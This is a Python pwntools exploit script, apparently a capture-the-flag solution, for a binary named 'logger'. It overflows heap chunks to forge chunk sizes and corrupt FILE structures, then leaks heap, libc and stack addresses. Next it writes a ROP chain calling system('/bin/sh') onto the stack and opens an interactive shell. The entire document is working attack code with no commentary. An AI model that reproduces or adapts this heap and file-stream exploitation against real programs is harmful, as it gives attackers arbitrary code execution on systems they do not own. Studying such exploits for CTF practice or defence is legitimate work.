#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './logger')
libc = ELF(exe.libc.path)

def write(idx, data):
  io.sendlineafter(b">> ", b"1")
  io.sendlineafter(b": ", str(idx).encode())
  io.sendafter(b": ", data)

def write2file(idx):
  io.sendlineafter(b">> ", b"2")
  io.sendlineafter(b": ", str(idx).encode())

def deletefile(idx):
  io.sendlineafter(b">> ", b"3")
  io.sendlineafter(b": ", str(idx).encode())

io = process()

for i in range(2): write(i, b"A"*0x10)
write2file(0)

write(0, b"A"*104 + p64(0x1050|1))
write(1, (b"A"*104 + p64(0x1e0|1) + p64(0xfbad2c80)).ljust(224, b'\x00') + p64(0x1))
write2file(1)

heap_base = u64(io.recv(136)[120:128].ljust(8, b'\x00')) - 0x1570
libc.address = u64(io.recvline()[192:200]) - libc.sym._IO_file_jumps
log.success(f'{heap_base = :#x}')
log.success(f'{libc.address = :#x}')

write(1, b"A"*104 + p64(0x1050 | 1) + FileStructure().write(libc.sym.environ, 0x2000))
write2file(1)

stack = u64(io.recvline()[0:8])
log.success(f'{stack = :#x}')

write(2, p64(libc.address+0x10f75b) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.address+0x2882f) + p64(libc.sym.system))
write(1, b"A"*104 + p64(0x1050|1) + FileStructure().read(stack-336, 0x100))

write2file(2)

io.interactive()
